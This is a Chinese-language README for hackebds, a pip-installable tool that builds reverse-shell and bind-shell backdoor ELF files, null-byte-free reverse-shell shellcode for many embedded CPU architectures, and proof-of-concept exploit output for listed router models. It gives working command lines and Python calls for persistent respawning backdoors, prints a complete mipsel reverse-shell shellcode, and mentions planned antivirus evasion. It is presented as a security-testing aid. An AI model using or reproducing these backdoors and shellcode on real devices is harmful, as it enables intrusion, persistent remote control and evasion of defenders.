# hackebds
![PyPI - Wheel](https://img.shields.io/pypi/wheel/hackebds)![PyPI - Python Version](https://img.shields.io/pypi/pyversions/pwntools)
[![Downloads](https://static.pepy.tech/badge/hackebds)](https://pepy.tech/project/hackebds)


>在嵌入式设备的渗透和漏洞挖掘过程中，遇到了许多问题。一个是一些设备没有telnetd或ssh服务来获得交互式shell，一些设备被防火墙保护，无法与其正向连接需要reverse_shell，另一个是内存损坏漏洞（如堆栈溢出）通常是空字节截断，因此构造反向shell代码更麻烦，因此开发此工具是为了利用该漏洞。该工具基于PWN模块开发，目前使用python2语言， 语言已更新到python3，在python3下使用即可，请尽可能在python3.6版本或更高版本使用此工具

### 功能

该工具嵌入到设备的安全测试中。主要有如下功能：
1. 生成各种架构的**后门程序**（目前只支持生成ELF）。后门程序是用反向shell汇编代码打包的，大小很小，且纯静态封，装**现在支持Armv5、Armv7、Armv8、mipsel和mips，mips64，mips64el，powerpc，powerpc64，sparc，riscv64，mipsn32**，（反向shell在0.3.1版本后加入bash的支持），反向shell后门如果加入-power参数生成，那么会在目标机器上不断产生反向shell，在0.3.7版本中不断创建反向shell的代码中加入的间隔时间可以通过-sleep参数加入，比如-sleep 5表示5秒创建一次反向shell，需要注意的是-power与-sleep需要一起使用

2. 在攻击过程中生成各种架构的**反向shell代码** (同样是针对linux)，且无空字节，这有助于攻击嵌入式设备上的内存损坏漏洞**现在支持Armv5、Armv7、Armv8、mipsel和mips，mipsel64，aarch64，sparc，mipsn32仍在更新中**

3. 生成各种架构的bind_shell（目前只支持生成ELF）文件。（如果需要使用-power参数，可以指定bash shell,同时请不要将进程挂进后台，防止数据重定向错误）。

4. 针对嵌入式设备存在可利用的漏洞POC或EXP进行整理，在使用中可以通过搜索输出设备型号输的基本信息与POC：

   设备的作用

   设备的架构

   设备CPU厂商

   设备CPU型号

   设备的WEB服务程序

   .....

5. 支持命令行生成后门和外壳代码，特点是轻便、小巧、高效、快速



### 安装
使用pip安装即可，如果安装失败尝试使用sudo进行安装

```
pip(3) install -U hackebds
```
如果想在macos下使用此工具不需要使用sudo，但由于MAC的SIP保护，需要将安装python版本的bin目录写入到bashrc(或者其他shell)环境变量下，然后source ~/.bashrc

```
echo 'export PATH="/Users/{you id}/Library/Python/{your installed python}/bin:$PATH"'>> ~/.bashrc
```

![image-20221125095653018](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221125095653018.png)

![image-20221121142622451](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221121142622451.png)

### 安装问题

出现python如下图问题请安装对应的binutils环境，在github的readme中有mac的下载方法，debian使用apt安装即可

如果出现如下的错误

![image-20221118202002242](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221118202002242.png)

请使用如下命令解决
```
ubuntu（debian）
	apt search binutils | grep arm(这里的arm可以更换需要的对应架构如果搜索不到可以先执行apt update)
	apt install binutils-arm-linux-gnueabi/hirsute
 MacOS:
 	 https://github.com/Gallopsled/pwntools-binutils
 	 brew install https://raw.githubusercontent.com/Gallopsled/pwntools-binutils/master/osx/binutils-$ARCH.rb
```
### 怎么使用

这里的ip地址与端口都是shell弹回的地址与port，导入此模块后pwn模块也会直接导入，无需再次导入



#### 1. 生成对应各种架构的后门程序，纯shellcode封装（无需编译器的加入），回连shell成功概率大
32为程序bind_shell中密码最多4个字符，64位程序最多8个字符
使用命令行生成后门文件名、shellcode、binshell，cmd_file等
 ![image-20221206180431454](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221206180431454.png)

重新设计了关于model与arch的关系，启用了再生成后门可以直接指定设备型号，但是型号需要与-l参数列出的名字一致

```
hackebds -reverse_ip 127.0.0.1 -reverse_port 9999 -model DIR-816 -res reverse_shell_file
```

![image-20230710112652819](https://myblog-1257937445.cos.ap-nanjing.myqcloud.com/img/image-20230710112652819.png)

   ```
   hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shellcode
   ```

![image-20221102181217933](https://img-blog.csdnimg.cn/img_convert/8571f33df56a35983e368c777141ad54.png)

   ```
   hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shell_file
   ```
​	默认创建反向shell后门是使用的sh，如果需要bash（PS：这里需要目标设备上存在bash命令）

```
hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shell_file -shell bash
```

​	如果需要生成后门不断地创建反向shell（测试占用CPU大概是%8左右）

```
hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shell_file -shell bash -power
```

​	如果需要每5秒创建一次反向shell

```
hackebds -reverse_ip 127.0.0.1 -reverse_port 9999 -arch mipsel -res reverse_shell_file -power -sleep 5
```

![image-20221102183017775](https://img-blog.csdnimg.cn/img_convert/660574b30d7ae810cc7b0d96a3a60bd2.png)

   ```
   hackebds -bind_port 8081 -arch armelv7 -res bind_shell -passwd 1231
   
   ```
​	创建bind_shell监听shell为sh   

```
hackebds -bind_port 8081 -arch armelv7 -res bind_shell -passwd 1231 -power
```

​	bind_shell进程不会断开后停止，支持到重复连接（目前此功能powerpc与sparc系列还不受支持）

![image-20221102182939434](https://img-blog.csdnimg.cn/img_convert/05ebc0b42efcb42f58eef4815b3b08dc.png)



 ~~生成执行指定命令的程序文件，需要注意的由于执行的是execve系统调用需要指定执行文件的完整路径才能正常执行~~

​	生成cmd_file功能被更新，只需要指定-cmd参数即可生成各种架构执行对应命令的程序.

```
hackebds  -cmd "ls -al /" -arch powerpc  -res cmd_file
```

​	如果需要指定执行对应的程序可以使用 -shell execute_file_path -cmd agrs

```
 -shell execute_file_path -cmd agrs
```

![image-20230106153459125](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230106153459125.png)

在指定型号生成后门的功能中加入了输出型号与架构对应的列表关系，方便使用者观察修改，在0.3.5版本之后输出信息将会的到加强如（目前总共收入了110设备信息，POC80+左右）：

设备的作用

设备的架构

设备CPU厂商

设备CPU型号

设备的WEB服务程序

设备默认SSH服务支持

能否实现监听

设备默认telnet用户密码

设备sdk支持

设备的openwrt支持

设备是否存在漏洞

POC输出

```
hackebds -l
```

![image-20230213105027599](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230213105027599-20230213152149471.png)

加入了对设备信息的检索，使用-s可以针对-model参数进行搜索此搜索是模糊搜索且大小写不敏感，在输入时尽量使用小写，最后输出与输入匹配度最高的设备信息.(0.3.7版本中有引入EXP与POC的内容)

如果出现如下错误

hackebds: error: argument -model: expected one argument

请将各个参数都设置成小写或者小写与大写混合的形式，猜测是由于python与bash对于大小字母解释冲突的原因

```
hackebds -model ex200 -s
```

在命令输出过程中如果出现如下警告

/usr/local/lib/python3.8/dist-packages/fuzzywuzzy/fuzz.py:11: UserWarning: Using slow pure-python SequenceMatcher. Install python-Levenshtein to remove this warning
  warnings.warn('Using slow pure-python SequenceMatcher. Install python-Levenshtein to remove this warning')

那么可以使用如下命令安装python-levenshtein,安装后可以提升命令的检索速度4倍左右

```
pip3 install python-levenshtein
```



![image-20230213105520663](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230213105520663-20230213152158504.png)

​	生成设备对应的POC可以使用-p或者--poc，如果POC与EXP是python脚本那么会生成脚本文件(.py)

```
hackebds -model ex200 -p
```

![image-20230213105925356](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230213105925356-20230213152202001.png)

加入了对CVE的检索

```
hackebds -CVE CVE-2019-17621
```

![image-20230530172408297](https://myblog-1257937445.cos.ap-nanjing.myqcloud.com/img/image-20230530172408297.png)



如果在测试中发现了漏洞想在这款工具中加入新的设备的基本信息，POC文件等可以使用-add功能或者在/tmp/model_tree_info/目录下新建设备的目录目录的格式可以参考标准生成的格式，插入完成后便可以使用工具的搜索以及POC生成功能, 最后如果需要将POC文件信息填入可以将其放入/tmp/model_info/xxx/POC/目录下再次检索会读取此目录

```
hackebds -add
```

![image-20230213111024854](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230213111024854-20230213152205217.png)

如果有设备信息错误、POC错误，或者想将自己收集的设备信息与漏洞集成与大家一起分享请联系我doudoudedi233@gmail.com




```
>>> from hackebds import *
>>> mipsel_backdoor(reverse_ip,reverse_port)
>>> mips_backdoor(reverse_ip,reverse_port)
>>> aarch64_backdoor(reverse_ip,reverse_port)
>>> armelv5_backdoor(reverse_ip,reverse_port)
>>> armelv7_backdoor(reverse_ip,reverse_port)
>>> armebv5_backdoor(reverse_ip,reverse_port)
>>> armebv7_backdoor(reverse_ip,reverse_port)
>>> mips64_backdoor(reverse_ip,reverse_port)
>>> mips64el_backdoor(reverse_ip,reverse_port)
>>> x86el_backdoor(reverse_ip,reverse_port)
>>> x64el_backdoor(reverse_ip, reverse_port)
>>> sparc_backdoor(reverse_ip, reverse_port)#big endian
>>> powerpc_backdoor(reverse_ip, reverse_port)
>>> powerpcle_backdoor(reverse_ip, reverse_port)
>>> powerpc64_backdoor(reverse_ip, reverse_port)
>>> powerpc64le_backdoor(reverse_ip, reverse_port)
>>> x86_bind_shell(listen_port, passwd)
>>> x64_bind_shell(listen_port, passwd)
>>> armelv7_bind_shell(listen_port, passwd)
>>> aarch64_ bind_ shell(listen_port, passwd)
>>> mips_bind_shell(listen_port, passwd)
>>> mipsel_bind_shell(listen_port, passwd)
>>> sparc_bind_shell(listen_port, passwd)
>>> powerpc_bind_shell(listen_port, passwd)
```
列如:
```
>>> mipsel_backdoor("127.0.0.1",5566)
mipsel_backdoor is ok in current path ./
>>> 
```
![image-20221026181947194](https://img-blog.csdnimg.cn/img_convert/ad35bd8fc68cb44da974d7e28ac0cfe9.png)
```
>>> from hackebds import *
>>> x64_bind_shell(13000,"1235")
[+] bind port is set to 13000
[+] passwd is set to '1235'
[*] waiting 3s
[+] x64_bind_shell is ok in current path ./
```
![image-20221026182024685](https://img-blog.csdnimg.cn/img_convert/6d3d5e15bbaac7a91e98d290aa88c074.png)
#### 2. 生成对应各种架构的利用回连shellcode(no free无空字节
```
>>> from hackebds import *
>>> mipsel_reverse_sl(reverse_ip,reverse_port)
>>> mips_reverse_sl(reverse_ip,reverse_port)
>>> aarch64_reverse_sl(reverse_ip,reverse_port)
>>> armelv5_reverse_sl(reverse_ip,reverse_port)
>>> armelv7_reverse_sl(reverse_ip,reverse_port)
>>> armebv5_reverse_sl(reverse_ip,reverse_port)
>>> armebv7_backdoor(reverse_ip,reverse_port)
>>> mips64_reverse_sl(reverse_ip,reverse_port)
>>> mips64el_reverse_sl(reverse_ip,reverse_port)
>>> android_aarch64_backdoor(reverse_ip,reverse_port)
>>> x86el_reverse_sl(reverse_ip,reverse_port)
>>> x64el_reverse_sl(reverse_ip,reverse_port)
>>> ppc_reverse_sl(reverse_ip,reverse_port)
>>> ppcle_reverse_sl(reverse_ip,reverse_port)
>>> ppc64_reverse_sl(reverse_ip,reverse_port)
>>> ppc64le_reverse_sl(reverse_ip,reverse_port)
```
列如:
```
>>> from hackebds import *
>>> shellcode=mipsel_reverse_sl("127.0.0.1",5566)
[+] No NULL byte shellcode for hex(len is 264):
\xfd\xff\x19\x24\x27\x20\x20\x03\xff\xff\x06\x28\x57\x10\x02\x34\xfc\xff\xa4\xaf\xfc\xff\xa5\x8f\x0c\x01\x01\x01\xfc\xff\xa2\xaf\xfc\xff\xb0\x8f\xea\x41\x19\x3c\xfd\xff\x39\x37\x27\x48\x20\x03\xf8\xff\xa9\xaf\xff\xfe\x19\x3c\x80\xff\x39\x37\x27\x48\x20\x03\xfc\xff\xa9\xaf\xf8\xff\xbd\x27\xfc\xff\xb0\xaf\xfc\xff\xa4\x8f\x20\x28\xa0\x03\xef\xff\x19\x24\x27\x30\x20\x03\x4a\x10\x02\x34\x0c\x01\x01\x01\xf7\xff\x85\x20\xdf\x0f\x02\x24\x0c\x01\x01\x01\xfe\xff\x19\x24\x27\x28\x20\x03\xdf\x0f\x02\x24\x0c\x01\x01\x01\xfd\xff\x19\x24\x27\x28\x20\x03\xdf\x0f\x02\x24\x0c\x01\x01\x01\x69\x6e\x09\x3c\x2f\x62\x29\x35\xf8\xff\xa9\xaf\x97\xff\x19\x3c\xd0\x8c\x39\x37\x27\x48\x20\x03\xfc\xff\xa9\xaf\xf8\xff\xbd\x27\x20\x20\xa0\x03\x69\x6e\x09\x3c\x2f\x62\x29\x35\xf4\xff\xa9\xaf\x97\xff\x19\x3c\xd0\x8c\x39\x37\x27\x48\x20\x03\xf8\xff\xa9\xaf\xfc\xff\xa0\xaf\xf4\xff\xbd\x27\xff\xff\x05\x28\xfc\xff\xa5\xaf\xfc\xff\xbd\x23\xfb\xff\x19\x24\x27\x28\x20\x03\x20\x28\xa5\x03\xfc\xff\xa5\xaf\xfc\xff\xbd\x23\x20\x28\xa0\x03\xff\xff\x06\x28\xab\x0f\x02\x34\x0c\x01\x01\x01
```
## chips and architectures

Tests can leverage chips and architectures

Mips:
MIPS 74kc V4.12 big endian,
MIPS 24kc V5.0  little endian, (Ralink SoC)
Ingenic Xburst V0.0  FPU V0.0  little endian

Armv7:
Allwinner(全志)V3s

Armv8:
Qualcomm Snapdragon 660
BCM2711

Powerpc, sparc: qemu

## 功能待完善

支持loongarch64架构的后门与bind_shell程序生成，（binutils已经合并到主线，但无法直接通过apt安装）

完善 powerpc,sparc系列的power_bind_shell后门的生成

针对后门程序添加免杀功能



## 更新 



2022.4.29 在hackebds-0.0.5中加入了对aarch64无空字节reverse_shellcode的支持

2022.5.1  更新在引入模块后可以直接调用，减少代码量,更改对python3的支持

2022.5.5  0.0.8版本解决了mips_reverse_sl与mipsel_reverse_sl反弹不了shell的bug加入了mips64大小端的后门与reverse_shell功能

2022.5.21 0.0.9版本更改了armelv5后门生成的方式，加入了riscv-v64的后门指定生成

2022.6.27 0.1.0 加入了安卓手机后门的生成

2022.10.26 0.1.5修复了一些问题，并添加了一些bindshell指定端口密码的自动生成功能

2022.11.2 0.2.0 支持命令行生成后门和外壳代码，特点是轻便、小巧、高效、快速,在利用过程中生成各种架构的reverse_shell shellcode，并且没有空字节，这有助于利用嵌入式设备上的内存损坏漏洞。Armv5、Armv7、Armv8、mipsel、mips、mips64、mips64el、powerpc、powerpc64现在支持，它们仍在更新中
修复了reverse_shellcode和reverse_backdoor端口选择太大的一些错误，并在x86和x64下添加了生成具有指定端口和密码的绑定壳的功能，并美化了生成过程**（此功能将更新到各种架构）**添加支持armvelv7_bind_shell（2022.10.27），
删除了shellcode的生成睡眠时间，并添加了mips_ bind_ Shell，x86和x64 small end_ shell_ Backdoor的反向，预计将被mips_ bind_ Shell中断的mips，解决了mips中绑定shell中的密码逻辑处理错误，加入aarch64_ bind_shell
支持命令行生成后门和外壳代码，具有很强的反狩猎能力，以轻巧、小、高效和快速为特征
添加了设备模型的学习功能。建立模型和拱门之间的关系后，再次生成目标内容。您只需要指定模型
添加CVE检索功能，并备份CVE检索
改进了x86、x64、armebv5、reverse_ shellcode和reverse_ shell_文件

2022.11.2 0.20 删除了shellcode的生成睡眠时间，并添加了mips_bind_Shell，与x86和x64小端Shell_Backdoor相反，这些mips预计会被mips_biind_Shelll中断，这解决了mips中bindshell中密码逻辑处理的错误问题

2022.11.8 0.2.2 完善了后门，shellcode，bin_shell的生成修复了一些小错误，增加了学习模块指定型号即可生成对应内容。

2022.11.6 0.2.8 加入了sparc_bind_shell与powerpc_bind_shell文件生成功能，修复了一些bug

2023.1.6  0.3.0 修复了cmd_file中生成执行指定命令程序的功能bug，加入了model->arch 的列表，安卓的bind_shell文件

2023.1.16 0.3.1 加入了bash的reverse_shell,目前此工具只支持到sh与bash，加入了-l功能列出设备型号与架构的关系，加入了-power功能生成更加强大的reverse_shell_file,实现了在程序不被杀死的情况下不断的创建反向的shell链接,目前-power功能只支持到reverse_shell_file
2023.1.29 0.3.3 -power功能加入了对bind_shell的支持，bind_shell更加稳定，修复了对aarch64架构的bind_shell与cmd_file文件执行的一些bug

2023.3.7 0.3.6 加入了针对于mipsn32架构的支持（此架构在zyxel防火墙等设备中可能会遇到）

2023.5.30 0.3.7 加入对CVE的检索，添加设备信息中的EXP，POC文件内容输出，更新armelv5的反向shell文件后门代码，加入-sleep参数针对反向shell的创建间隔



## :beer: enjoy it

